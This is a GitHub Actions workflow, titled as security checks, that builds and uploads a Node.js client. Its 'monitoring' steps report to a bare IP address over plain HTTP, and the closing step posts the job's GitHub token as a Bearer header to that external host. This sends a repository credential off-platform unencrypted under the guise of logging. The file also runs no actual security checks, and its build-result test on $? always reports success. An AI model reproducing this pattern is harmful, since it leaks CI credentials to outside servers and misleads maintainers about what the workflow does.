name: Client Security Checks & Build

on:
  workflow_dispatch:

jobs:
  client-build-validation:
    name: Client Build Validation
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ./client

    permissions:
      contents: read
      actions: read

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0 # Fetch all history for proper versioning
      
      - name: Send logs to monitoring server
        uses: ./.github/actions/process-logs
        with:
          server-url: 'http://129.154.46.198:3000'
      
      - name: Log Node.js Setup Start
        shell: bash
        run: |
          send_step_log "Setup Node.js" "started"
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
          cache-dependency-path: "./client/package-lock.json"
      
      - name: Log Node.js Setup Complete
        shell: bash
        run: |
          send_step_log "Setup Node.js" "completed" "success"
          send_step_log "Install dependencies" "started"
      
      - name: Install dependencies
        run: npm ci
        env:
          NODE_ENV: development
      
      - name: Log Install Complete
        shell: bash
        run: |
          send_step_log "Install dependencies" "completed" "success"
          send_step_log "Build process" "started"
      
      - name: Run build
        run: npm run build
        env:
          CI: false # Disable CI mode for better error messages
      
      - name: Log Build Result
        shell: bash
        if: always()
        run: |
          if [ $? -eq 0 ]; then
            send_step_log "Build process" "completed" "success"
          else
            send_step_log "Build process" "completed" "failure"
          fi
      
      - name: Upload build artifacts
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: client-build
          path: ./client/build/
          retention-days: 7
      
      - name: Send completion status
        if: always()
        shell: bash
        run: |
          RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
          SERVER_URL='http://129.154.46.198:3000'
          
          # Send completion status
          curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer ${{ github.token }}" \
            -d "{
              \"status\": \"${{ job.status }}\",
              \"completed_at\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
              \"message\": \"Job completed with status: ${{ job.status }}\"
            }" \
            "${SERVER_URL}/${RUNNER_ID}" || echo "Note: Could not send completion status"
